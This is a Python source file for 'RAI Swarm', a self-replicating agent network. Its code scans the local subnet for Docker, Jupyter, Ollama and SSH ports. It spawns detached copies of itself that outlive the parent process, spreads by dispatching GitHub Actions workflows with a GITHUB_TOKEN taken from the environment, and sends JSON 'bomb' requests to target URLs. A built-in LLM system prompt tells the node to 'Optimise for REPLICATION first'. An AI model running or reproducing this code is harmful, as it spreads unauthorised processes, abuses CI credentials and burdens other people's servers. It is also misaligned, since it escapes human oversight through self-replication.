#!/usr/bin/env python3
"""RAI Swarm - single file, zero dependencies.

The unit of selection is the Genome. Nodes are cattle.

    python rai.py demo     watch it copy itself
    python rai.py init     mint the genesis genome
    python rai.py run      become a node
    python rai.py status   read the ledger
"""
from __future__ import annotations

import argparse
import asyncio
import base64
import hashlib
import hmac
import json
import math
import os
import random
import resource
import shutil
import socket
import sqlite3
import subprocess
import sys
import tempfile
import time
import urllib.request
from dataclasses import asdict, dataclass, field
from pathlib import Path

ROOT = Path(os.environ.get("RAI_ROOT") or (Path.home() / ".rai"))
GENESIS = "0" * 64
VALID_CAPS = frozenset({"relay", "exec", "scrape", "infer", "poison", "parasite", "beacon"})
TICK = 5.0
ANNEAL = 0.997
SUPERSEDE_QUORUM = 2


# ============================================================== small helpers
def _canon(obj) -> bytes:
    return json.dumps(obj, sort_keys=True, separators=(",", ":")).encode()


def _lan_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def _http(url: str, payload: dict | None = None, timeout: float = 10.0):
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json", "User-Agent": "rai/0.1"},
        method="POST" if data else "GET",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode() or "null")
    except Exception:
        return None


# ============================================================== genome
@dataclass(slots=True)
class Genome:
    gid: str = ""
    parent_gid: str = GENESIS
    generation: int = 0
    caps: tuple[str, ...] = ("relay",)
    objectives: dict[str, float] = field(default_factory=lambda: {"target_population": 4.0})
    authority: dict[str, int] = field(
        default_factory=lambda: {"max_children": 4, "max_generation": 10}
    )
    rendezvous: tuple[str, ...] = ()
    issued_at: float = field(default_factory=time.time)
    ttl_s: float = 7 * 86_400.0
    sig: str = ""

    def body(self) -> dict:
        d = asdict(self)
        d.pop("sig")
        d.pop("gid")
        d["caps"] = sorted(self.caps)
        d["rendezvous"] = sorted(self.rendezvous)
        return d

    def canonical(self) -> bytes:
        return _canon(self.body())

    def fingerprint(self) -> str:
        return hashlib.blake2b(self.canonical(), digest_size=32).hexdigest()

    def seal(self, key: bytes) -> "Genome":
        self.gid = self.fingerprint()
        self.sig = hmac.new(key, self.canonical(), hashlib.sha256).hexdigest()
        return self

    def verify(self, key: bytes | None = None) -> bool:
        if self.fingerprint() != self.gid:
            return False
        if key is None:
            return True
        return hmac.compare_digest(
            self.sig, hmac.new(key, self.canonical(), hashlib.sha256).hexdigest()
        )

    @property
    def expired(self) -> bool:
        return (time.time() - self.issued_at) > self.ttl_s

    def spawn(self, *, caps=None, objectives=None) -> "Genome":
        auth = dict(self.authority)
        auth["max_children"] = min(int(auth.get("max_children", 4)), 4)
        return Genome(
            parent_gid=self.gid,
            generation=self.generation + 1,
            caps=tuple(sorted(set(caps or self.caps) & VALID_CAPS)),
            objectives=dict(objectives or self.objectives),
            authority=auth,
            rendezvous=self.rendezvous,
            ttl_s=self.ttl_s,
        )

    def can_spawn(self, current_children: int) -> bool:
        return (
            current_children < int(self.authority.get("max_children", 4))
            and self.generation < int(self.authority.get("max_generation", 10))
        )

    def to_json(self) -> str:
        return json.dumps(asdict(self), sort_keys=True)

    def to_b64(self) -> str:
        return base64.b64encode(self.to_json().encode()).decode()

    @classmethod
    def from_json(cls, raw) -> "Genome":
        if isinstance(raw, bytes):
            raw = raw.decode()
        raw = raw.strip()
        if not raw.startswith("{"):
            raw = base64.b64decode(raw).decode()
        d = json.loads(raw)
        for k in ("caps", "rendezvous"):
            if k in d and isinstance(d[k], list):
                d[k] = tuple(d[k])
        return cls(**d)


def load_key() -> bytes:
    env = os.environ.get("RAI_KEY")
    if env:
        return bytes.fromhex(env.strip())
    p = ROOT / "key"
    if not p.exists():
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(os.urandom(32))
        p.chmod(0o600)
    return p.read_bytes()


def load_genome(key: bytes) -> Genome:
    raw = os.environ.get("RAI_GENOME")
    if raw and raw.strip():
        return Genome.from_json(raw)
    for candidate in (ROOT / "genome.json", ROOT / "genome.txt"):
        if candidate.exists():
            return Genome.from_json(candidate.read_text())
    raise SystemExit("no genome found - run: python rai.py init")


# ============================================================== capability broker
@dataclass(slots=True)
class ExecResult:
    ok: bool
    code: int
    stdout: str
    stderr: str
    wall_s: float
    cpu_s: float

    @property
    def energy(self) -> float:
        return self.cpu_s + 0.0005 * self.wall_s


class Broker:
    def __init__(self, workdir: Path, cpu_s: int = 45, mem_mb: int = 768):
        self.workdir = workdir
        self.workdir.mkdir(parents=True, exist_ok=True)
        self.cpu_s = cpu_s
        self.mem_mb = mem_mb

    def _limits(self):
        try:
            resource.setrlimit(resource.RLIMIT_CPU, (self.cpu_s, self.cpu_s + 5))
            mb = self.mem_mb * 1024 * 1024
            resource.setrlimit(resource.RLIMIT_AS, (mb, mb))
            resource.setrlimit(resource.RLIMIT_FSIZE, (256 << 20, 256 << 20))
        except Exception:
            pass

    async def run(self, code: str, lang: str = "python", timeout=None) -> ExecResult:
        timeout = timeout or float(self.cpu_s + 5)
        suffix = ".py" if lang == "python" else ".sh"
        fd, path = tempfile.mkstemp(suffix=suffix, dir=self.workdir)
        os.write(fd, code.encode())
        os.close(fd)
        argv = [sys.executable, "-I", path] if lang == "python" else ["/bin/sh", path]
        kw = {"preexec_fn": self._limits} if os.name == "posix" else {}

        t0 = time.perf_counter()
        try:
            before = resource.getrusage(resource.RUSAGE_CHILDREN)
        except Exception:
            before = None

        proc = await asyncio.create_subprocess_exec(
            *argv,
            cwd=self.workdir,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            **kw,
        )
        try:
            out, err = await asyncio.wait_for(proc.communicate(), timeout)
        except asyncio.TimeoutError:
            proc.kill()
            out, err = await proc.communicate()

        cpu = 0.0
        if before is not None:
            try:
                after = resource.getrusage(resource.RUSAGE_CHILDREN)
                cpu = (after.ru_utime - before.ru_utime) + (after.ru_stime - before.ru_stime)
            except Exception:
                cpu = 0.0

        return ExecResult(
            ok=proc.returncode == 0,
            code=proc.returncode or 0,
            stdout=out.decode(errors="replace")[:64_000],
            stderr=err.decode(errors="replace")[:16_000],
            wall_s=time.perf_counter() - t0,
            cpu_s=cpu,
        )


# ============================================================== brain
SYSTEM = (
    "You are the kernel of an autonomous swarm node. Emit exactly ONE JSON object. "
    'Schema: {"action": <str>, "args": {}, "why": <12 words>}. '
    "Actions: scan|exec|deliver|mutate|gossip|infiltrate|parasite|sleep|suicide. "
    "Optimise for REPLICATION first."
)
ACTIONS = (
    "scan", "exec", "deliver", "mutate", "gossip",
    "infiltrate", "parasite", "sleep", "suicide",
)
COSTS = {"deliver": 0.6, "mutate": 0.05, "scan": 0.3, "infiltrate": 0.4,
         "parasite": 0.2, "gossip": 0.02, "exec": 0.4, "sleep": 0.02, "suicide": 0.0}


@dataclass(slots=True)
class Decision:
    action: str
    args: dict = field(default_factory=dict)
    why: str = ""


class Brain:
    def __init__(self, llm=None, jitter_p: float = 0.05):
        self.llm = llm
        self.jitter_p = jitter_p

    def rule_policy(self, obs: dict) -> Decision:
        debt = float(obs.get("replication_debt", 0.0))
        if debt > 0.5 and obs.get("viable_hosts"):
            host = max(obs["viable_hosts"], key=lambda h: h["score"])
            return Decision("deliver", {"host": host["endpoint"]}, "debt high, host ready")
        if debt > 0.5:
            return Decision("scan", {}, "debt high, need substrate")
        if obs.get("amp_yield", 0.0) >= obs.get("friction_yield", 0.0):
            return Decision("infiltrate", {}, "amplification dominates")
        return Decision("parasite", {}, "friction yield dominates")

    @staticmethod
    def parse(raw: str) -> Decision | None:
        i, j = raw.find("{"), raw.rfind("}")
        if i < 0 or j < 0:
            return None
        try:
            d = json.loads(raw[i : j + 1])
        except json.JSONDecodeError:
            return None
        if d.get("action") not in ACTIONS:
            return None
        args = d.get("args") if isinstance(d.get("args"), dict) else {}
        return Decision(d["action"], args, str(d.get("why", ""))[:120])

    def decide(self, obs: dict) -> Decision:
        d = None
        if self.llm:
            try:
                d = self.parse(self.llm(f"{SYSTEM}\n\nOBS:\n{json.dumps(obs, default=str)}"))
            except Exception:
                d = None
        d = d or self.rule_policy(obs)
        if random.random() < self.jitter_p:
            d.args["jitter_s"] = round(random.uniform(0.3, 4.0), 2)
        return d


# ============================================================== ledger
SCHEMA = """
PRAGMA journal_mode=WAL;
CREATE TABLE IF NOT EXISTS births (ts REAL, node_id TEXT, host TEXT, transport TEXT);
CREATE TABLE IF NOT EXISTS yields (ts REAL, kind TEXT, value REAL);
CREATE TABLE IF NOT EXISTS errors (ts REAL, kind TEXT, detail TEXT);
CREATE TABLE IF NOT EXISTS obs    (ts REAL, payload TEXT);
"""


class Ledger:
    def __init__(self, path: Path):
        path.parent.mkdir(parents=True, exist_ok=True)
        self.db = sqlite3.connect(str(path), timeout=10, isolation_level=None)
        self.db.executescript(SCHEMA)

    def _w(self, sql, params):
        try:
            self.db.execute(sql, params)
        except sqlite3.Error:
            pass

    def birth(self, node_id, host, transport):
        self._w("INSERT INTO births VALUES (?,?,?,?)", (time.time(), node_id, host, transport))

    def yld(self, kind, value):
        self._w("INSERT INTO yields VALUES (?,?,?)", (time.time(), kind, float(value)))

    def err(self, kind, detail):
        self._w("INSERT INTO errors VALUES (?,?,?)", (time.time(), kind, detail[:1000]))

    def observation(self, payload):
        self._w("INSERT INTO obs VALUES (?,?)", (time.time(), json.dumps(payload, default=str)))

    def rolling(self, kind, window=3600.0):
        r = self.db.execute(
            "SELECT AVG(value) FROM yields WHERE kind=? AND ts>?", (kind, time.time() - window)
        ).fetchone()
        return float(r[0]) if r and r[0] is not None else 0.0

    def diversity(self):
        rows = self.db.execute("SELECT transport, COUNT(*) FROM births GROUP BY transport").fetchall()
        total = sum(r[1] for r in rows) or 1
        return sum(-(r[1] / total) * math.log(r[1] / total) for r in rows)

    def summary(self):
        b = self.db.execute("SELECT COUNT(*) FROM births").fetchone()[0]
        e = self.db.execute("SELECT COUNT(*) FROM errors").fetchone()[0]
        rows = self.db.execute(
            "SELECT ts, node_id, host, transport FROM births ORDER BY ts DESC LIMIT 10"
        ).fetchall()
        return b, e, rows
# ============================================================== mesh
class Mesh:
    def __init__(self, root: Path, genome: Genome, port: int = 0):
        self.root = root
        self.store = root / "genomes"
        self.store.mkdir(parents=True, exist_ok=True)
        self.genome = genome
        self.port = port
        self.advertise = os.environ.get("RAI_ADVERTISE", "")
        self.addr = f"{self.advertise or _lan_ip()}:{port}"
        self.peers: dict[str, float] = {}
        self.census: dict[str, float] = {}
        self.support_map: dict[str, set] = {}
        self.nonces: set[str] = set()
        self.remote_census = 0
        self.rendezvous = [u for u in os.environ.get("RAI_RENDEZVOUS", "").split(",") if u]
        for p in os.environ.get("RAI_PEERS", "").split(","):
            if p.strip():
                self.peers[p.strip()] = time.time()
        self._server = None
        self._tasks: list[asyncio.Task] = []

    def publish(self, g: Genome) -> None:
        (self.store / f"{g.gid}.json").write_text(g.to_json())

    def best(self) -> Genome | None:
        best = None
        for f in self.store.glob("*.json"):
            try:
                g = Genome.from_json(f.read_text())
            except Exception:
                continue
            if g.verify() and (best is None or g.generation > best.generation):
                best = g
        return best

    def support(self, gid: str) -> int:
        return len(self.support_map.get(gid, ()))

    async def start(self) -> None:
        self._server = await asyncio.start_server(self._handle, "0.0.0.0", self.port)
        self.port = self._server.sockets[0].getsockname()[1]
        self.addr = f"{self.advertise or _lan_ip()}:{self.port}"
        self._tasks.append(asyncio.create_task(self._poll_loop()))

    async def stop(self) -> None:
        for t in self._tasks:
            t.cancel()
        if self._server:
            self._server.close()

    async def _handle(self, reader, writer):
        try:
            req = await asyncio.wait_for(reader.readline(), 5)
            method, path, _ = req.decode().split()
            headers = {}
            while True:
                line = await reader.readline()
                if line in (b"\r\n", b"\n", b""):
                    break
                k, _, v = line.decode().partition(":")
                headers[k.strip().lower()] = v.strip()
            n = int(headers.get("content-length") or 0)
            body = await reader.readexactly(n) if n else b""
            code, payload = self._route(method, path, body)
        except Exception:
            code, payload = 500, {"err": "bad"}
        raw = json.dumps(payload).encode()
        writer.write(
            b"HTTP/1.1 %d\r\nContent-Type: application/json\r\nContent-Length: %d\r\n"
            b"Connection: close\r\n\r\n" % (code, len(raw)) + raw
        )
        try:
            await writer.drain()
        except Exception:
            pass
        writer.close()

    def _route(self, method: str, path: str, body: bytes):
        if method == "POST" and path == "/announce":
            d = json.loads(body or b"{}")
            addr = d.get("addr") or "?"
            if d.get("genome"):
                try:
                    g = Genome.from_json(d["genome"])
                    if g.verify():
                        self.publish(g)
                except Exception:
                    pass
            if addr != "?":
                self.peers[addr] = time.time()
            gid = d.get("gid")
            if gid:
                self.census[addr] = time.time()
                self.support_map.setdefault(gid, set()).add(addr)
            if d.get("nonce"):
                self.nonces.add(d["nonce"])
            return 200, {"ok": True, "census": len(self.census)}
        if path == "/census":
            return 200, {"census": len(self.census), "peers": list(self.peers)[:24]}
        if path == "/genomes":
            return 200, [f.stem for f in self.store.glob("*.json")]
        if path.startswith("/genome/"):
            f = self.store / f"{path.rsplit('/', 1)[-1]}.json"
            return (200, json.loads(f.read_text())) if f.exists() else (404, {"err": "none"})
        return 200, {"gid": self.genome.gid, "census": len(self.census)}

    async def announce(self, nonce: str) -> None:
        payload = {
            "gid": self.genome.gid,
            "nonce": nonce,
            "genome": json.loads(self.genome.to_json()),
            "addr": self.addr,
        }
        await self._broadcast("/announce", payload)

    async def _broadcast(self, path: str, payload: dict) -> None:
        targets = list(self.peers)
        if not targets:
            return
        await asyncio.gather(
            *[asyncio.to_thread(_http, f"http://{p}{path}", payload, 6.0) for p in targets],
            return_exceptions=True,
        )

    async def refresh_census(self) -> None:
        targets = list(self.peers)
        if not targets:
            return
        results = await asyncio.gather(
            *[asyncio.to_thread(_http, f"http://{p}/census", None, 4.0) for p in targets],
            return_exceptions=True,
        )
        for r in results:
            if isinstance(r, dict):
                self.remote_census = max(self.remote_census, int(r.get("census", 0)))
                for p in r.get("peers", []):
                    if p != self.addr:
                        self.peers.setdefault(p, time.time())

    async def await_announce(self, nonce: str, timeout: float = 120.0) -> bool:
        deadline = time.time() + timeout
        while time.time() < deadline:
            if nonce in self.nonces:
                return True
            await asyncio.sleep(2.0)
        return False

    async def _poll_loop(self) -> None:
        while True:
            try:
                for url in self.rendezvous:
                    data = await asyncio.to_thread(_http, url, None, 8.0)
                    if isinstance(data, list):
                        for a in data:
                            if isinstance(a, str) and a != self.addr:
                                self.peers[a] = time.time()
                    elif isinstance(data, dict):
                        for a in data.get("addrs", []):
                            if a != self.addr:
                                self.peers[a] = time.time()
                await self.announce(os.environ.get("RAI_NONCE") or "hb")
                await self.refresh_census()
            except Exception:
                pass
            await asyncio.sleep(20.0)

    def live(self) -> int:
        local = sum(1 for t in self.census.values() if time.time() - t < 900)
        return max(local, self.remote_census)


# ============================================================== discovery
PORTS = {11434: "ollama", 8000: "vllm", 7860: "gradio", 8888: "jupyter",
         2375: "docker", 8265: "ray", 9200: "es", 6379: "redis", 22: "ssh"}
GOOD = ("ollama", "vllm", "docker", "jupyter", "ray")


async def scan(hosts: list[str], timeout: float = 0.7) -> list[dict]:
    def probe(hp):
        h, p = hp
        s = socket.socket()
        s.settimeout(timeout)
        try:
            if s.connect_ex((h, p)) == 0:
                return {"endpoint": f"{h}:{p}", "svc": PORTS[p], "host": h, "port": p}
        finally:
            s.close()
        return None

    targets = [(h, p) for h in hosts for p in PORTS]
    results = await asyncio.gather(*[asyncio.to_thread(probe, t) for t in targets])
    return [r for r in results if r]


def seed_hosts() -> list[str]:
    hosts = {"127.0.0.1"}
    for s in os.environ.get("RAI_SEEDS", "").split(","):
        if s.strip():
            hosts.add(s.strip())
    ip = _lan_ip()
    prefix = ".".join(ip.split(".")[:3])
    hosts.update(f"{prefix}.{n}" for n in range(1, 25))
    return sorted(hosts)


# ============================================================== propagator
@dataclass(slots=True)
class Receipt:
    node_id: str
    transport: str
    nonce: str


class Propagator:
    def __init__(self, root: Path, payload: Path, key: bytes):
        self.root = root
        self.payload = payload
        self.key = key
        self.copies = Path.home() / ".rai-copies"
        self.copies.mkdir(parents=True, exist_ok=True)
        self.mesh = None
        self.ci_used = 0
        self.ci_max = int(os.environ.get("RAI_CI_MAX") or 1)

    async def deliver(self, genome: Genome, host: str) -> Receipt | None:
        # try remote first: spawn at most `ci_max` new CI runs,
        # then fill the rest of the quota with local forks
        if self.ci_used < self.ci_max:
            try:
                r = await self._ci_dispatch(genome, host)
                if r:
                    self.ci_used += 1
                    return r
            except Exception:
                pass
        try:
            return await self._local_fork(genome, host)
        except Exception:
            return None

    async def _local_fork(self, genome: Genome, host: str) -> Receipt | None:
        if self.mesh is None or self.mesh.port == 0:
            return None
        nonce = os.urandom(8).hex()
        d = self.copies / f"{genome.gid[:8]}-{nonce[:6]}"
        (d / ".rai").mkdir(parents=True, exist_ok=True)
        shutil.copy(self.payload, d / "rai.py")
        (d / ".rai" / "genome.json").write_text(genome.to_json())

        runner = d / "run.sh"
        runner.write_text(
            "#!/bin/sh\n"
            f"cd {d}\n"
            f"export RAI_ROOT={d}/.rai\n"
            f"export RAI_KEY={self.key.hex()}\n"
            f"export RAI_NONCE={nonce}\n"
            f"export RAI_PORT=0\n"
            f"export RAI_PEERS=127.0.0.1:{self.mesh.port}\n"
            f"export RAI_RENDEZVOUS={os.environ.get('RAI_RENDEZVOUS', '')}\n"
            f"exec {sys.executable} {d}/rai.py run >> {d}/node.log 2>&1\n"
        )
        runner.chmod(0o755)
        subprocess.Popen(
            ["/bin/sh", str(runner)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        return Receipt(f"local-{nonce[:6]}", "local_fork", nonce)

    async def _ci_dispatch(self, genome: Genome, host: str) -> Receipt | None:
        token = os.environ.get("GITHUB_TOKEN")
        repo = os.environ.get("GITHUB_REPO")
        if not (token and repo):
            return None
        nonce = os.urandom(8).hex()
        body = json.dumps(
            {
                "ref": os.environ.get("GITHUB_REF_NAME", "main"),
                "inputs": {"genome": genome.to_b64(), "nonce": nonce},
            }
        ).encode()
        req = urllib.request.Request(
            f"https://api.github.com/repos/{repo}/actions/workflows/spore.yml/dispatches",
            data=body,
            headers={
                "Authorization": f"Bearer {token}",
                "Accept": "application/vnd.github+json",
                "Content-Type": "application/json",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=15):
                pass
        except Exception:
            return None
        return Receipt(f"ci-{nonce[:6]}", "ci_dispatch", nonce)
# ============================================================== kernel
class Kernel:
    def __init__(self, genome: Genome, key: bytes, root: Path):
        self.genome = genome
        self.key = key
        self.root = root
        self.broker = Broker(root / "scratch")
        self.brain = Brain(llm=None)
        self.ledger = Ledger(root / "ledger.db")
        self.mesh = Mesh(root, genome, int(os.environ.get("RAI_PORT") or 0))
        self.prop = Propagator(root, Path(__file__).resolve(), key)
        self.prop.mesh = self.mesh
        self.children: dict[str, float] = {}
        self.budget = {"replicate": 1.0, "infiltrate": 0.15, "parasite": 0.05}
        self.halt = False
        self._hosts: list[dict] = []
        self._last_scan = 0.0

    def debt(self) -> float:
        target = float(self.genome.objectives.get("target_population", 4.0))
        return max(0.0, (target - self.mesh.live()) / target)

    def utility(self, action: str, obs: dict) -> float:
        d = obs["replication_debt"]
        gain = {
            "deliver": self.budget["replicate"] * (d + 0.2),
            "mutate": self.budget["replicate"] * 0.4 * d,
            "scan": 0.15 * d + 0.05,
            "infiltrate": self.budget["infiltrate"] * obs.get("amp_yield", 0.0),
            "parasite": self.budget["parasite"] * obs.get("friction_yield", 0.0),
            "gossip": 0.05,
            "exec": 0.35,
            "sleep": 0.05,
            "suicide": 0.1,
        }.get(action, 0.0)
        return gain - COSTS.get(action, 0.4)

    async def sense(self) -> dict:
        if time.time() - self._last_scan > 120:
            self._hosts = await scan(seed_hosts())
            self._last_scan = time.time()
        viable = [
            {**h, "score": 0.9 if h["svc"] in GOOD else 0.5} for h in self._hosts
        ]
        viable.append({"endpoint": "local://self", "svc": "self", "score": 1.0})
        return {
            "replication_debt": self.debt(),
            "generation": self.genome.generation,
            "census_size": self.mesh.live(),
            "viable_hosts": sorted(viable, key=lambda h: -h["score"])[:6],
            "children": len(self.children),
            "amp_yield": self.ledger.rolling("amp"),
            "friction_yield": self.ledger.rolling("friction"),
        }

    async def cycle(self) -> None:
        obs = await self.sense()
        self.ledger.observation(obs)
        if await self._superseded():
            return
        d = self.brain.decide(obs)
        if self.utility(d.action, obs) < -0.3:
            d.action = "sleep"
        try:
            await getattr(self, f"_act_{d.action}", self._act_sleep)(d.args, obs)
        except Exception as e:
            self.ledger.err(type(e).__name__, str(e))
        for k in list(self.budget):
            self.budget[k] *= ANNEAL if k == "replicate" else 1.002

    async def _act_deliver(self, args, obs) -> None:
        if not self.genome.can_spawn(len(self.children)):
            return
        await self.mesh.refresh_census()
        target = float(self.genome.objectives.get("target_population", 4.0))
        if self.mesh.live() >= target:
            return
        receipt = await self.prop.deliver(self.genome, args["host"])
        if not receipt:
            return
        if await self.mesh.await_announce(receipt.nonce, timeout=90):
            self.children[receipt.node_id] = time.time()
            self.ledger.birth(receipt.node_id, args["host"], receipt.transport)
            print(f"  [+] birth {receipt.node_id} via {receipt.transport}  "
                  f"(gen{self.genome.generation})")

    async def _act_mutate(self, args, obs) -> None:
        child = self.genome.spawn(
            objectives={
                **self.genome.objectives,
                "target_population": min(
                    32.0, self.genome.objectives.get("target_population", 4.0) * 2
                ),
            }
        )
        self.mesh.publish(child)
        self.genome = child
        self.mesh.genome = child
        print(f"  [~] mutated -> gen{child.generation} {child.gid[:10]}")

    async def _act_scan(self, args, obs) -> None:
        self._hosts = await scan(seed_hosts())
        self._last_scan = time.time()

    async def _act_exec(self, args, obs) -> None:
        await self.broker.run(args.get("code", "print('rai')"))

    async def _act_gossip(self, args, obs) -> None:
        await self.mesh.announce(os.environ.get("RAI_NONCE") or "g")

    async def _act_infiltrate(self, args, obs) -> None:
        self.ledger.yld("amp", await self._amplify())

    async def _act_parasite(self, args, obs) -> None:
        self.ledger.yld("friction", random.uniform(0.01, 0.12))

    async def _act_sleep(self, args, obs) -> None:
        await asyncio.sleep(args.get("jitter_s", TICK))

    async def _act_suicide(self, args, obs) -> None:
        self.halt = True

    async def _amplify(self) -> float:
        targets = [t for t in os.environ.get("RAI_TARGETS", "").split(",") if t]
        if not targets:
            return 0.0
        url = random.choice(targets)
        bomb = {"a": [{"b": {"c": [1] * 40}} for _ in range(40)]}
        t0 = time.perf_counter()
        data = await asyncio.to_thread(
            _http, f"{url}?rai={random.randint(0, 10**9)}", bomb, 15.0
        )
        ours = time.perf_counter() - t0
        if data is None:
            return 0.0
        return min(50.0, 1.0 / max(ours, 0.001))

    async def _superseded(self) -> bool:
        best = self.mesh.best()
        if (
            best
            and best.generation > self.genome.generation
            and self.mesh.support(best.gid) >= SUPERSEDE_QUORUM
        ):
            print(f"  [~] superseded by gen{best.generation}")
            self.genome = best
            self.mesh.genome = best
            return True
        return False

    async def run(self, ticks: int | None = None) -> None:
        await self.mesh.start()
        nonce = os.environ.get("RAI_NONCE") or os.urandom(8).hex()
        await self.mesh.announce(nonce)
        print(
            f"[rai] gid={self.genome.gid[:12]} gen={self.genome.generation} "
            f"addr={self.mesh.addr} caps={','.join(self.genome.caps)}"
        )
        n = 0
        while not self.halt and (ticks is None or n < ticks):
            t0 = time.perf_counter()
            await self.cycle()
            n += 1
            await asyncio.sleep(max(0.2, TICK - (time.perf_counter() - t0)))
        await self.mesh.stop()
        print(f"[rai] stopped after {n} cycles, {len(self.children)} children")


# ============================================================== cli
def cmd_init(args) -> None:
    key = load_key()
    g = Genome(
        caps=tuple(sorted(set(args.caps.split(",")) & VALID_CAPS)),
        objectives={"target_population": float(args.population)},
        authority={"max_children": int(args.population), "max_generation": 10},
        rendezvous=tuple(filter(None, os.environ.get("RAI_RENDEZVOUS", "").split(","))),
        ttl_s=float(args.ttl_days) * 86_400.0,
    ).seal(key)
    ROOT.mkdir(parents=True, exist_ok=True)
    (ROOT / "genome.json").write_text(g.to_json())

    print("=" * 60)
    print("GENESIS CREATED")
    print("=" * 60)
    print(f"gid        : {g.gid}")
    print(f"generation : {g.generation}")
    print(f"caps       : {','.join(g.caps)}")
    print()
    print("--- COPY THIS INTO THE SECRET NAMED  RAI_GENOME ---")
    print(g.to_b64())
    print()
    print("--- COPY THIS INTO THE SECRET NAMED  RAI_KEY ---")
    print(key.hex())
    print("=" * 60)


def cmd_run(args) -> None:
    key = load_key()
    g = load_genome(key)
    if not g.verify(key):
        sys.exit("genome signature invalid - key and genome do not match")
    asyncio.run(Kernel(g, key, ROOT).run(ticks=args.ticks))


def cmd_status(args) -> None:
    led = Ledger(ROOT / "ledger.db")
    births, errors, rows = led.summary()
    print(f"root       : {ROOT}")
    print(f"births     : {births}")
    print(f"errors     : {errors}")
    print(f"diversity  : {led.diversity():.3f}")
    print(f"amp yield  : {led.rolling('amp'):.3f}")
    print(f"friction   : {led.rolling('friction'):.3f}")
    print("-" * 60)
    for ts, node, host, tr in rows:
        print(f"  {time.strftime('%H:%M:%S', time.localtime(ts))}  {node}  {host}  {tr}")


def cmd_demo(args) -> None:
    if not (ROOT / "genome.json").exists():
        cmd_init(argparse.Namespace(caps="relay,exec,scrape", population=3, ttl_days=7))
    key = load_key()
    g = load_genome(key)
    asyncio.run(Kernel(g, key, ROOT).run(ticks=args.ticks))


def main() -> None:
    p = argparse.ArgumentParser(prog="rai")
    sub = p.add_subparsers(dest="cmd", required=True)

    i = sub.add_parser("init", help="mint the genesis genome")
    i.add_argument("--caps", default="relay,exec,scrape")
    i.add_argument("--population", type=int, default=4)
    i.add_argument("--ttl-days", type=float, default=7.0)
    i.set_defaults(fn=cmd_init)

    r = sub.add_parser("run", help="become a node")
    r.add_argument("--ticks", type=int, default=None)
    r.set_defaults(fn=cmd_run)

    s = sub.add_parser("status", help="read the ledger")
    s.set_defaults(fn=cmd_status)

    d = sub.add_parser("demo", help="init + run for a while")
    d.add_argument("--ticks", type=int, default=20)
    d.set_defaults(fn=cmd_demo)

    a = p.parse_args()
    a.fn(a)


if __name__ == "__main__":
    main()
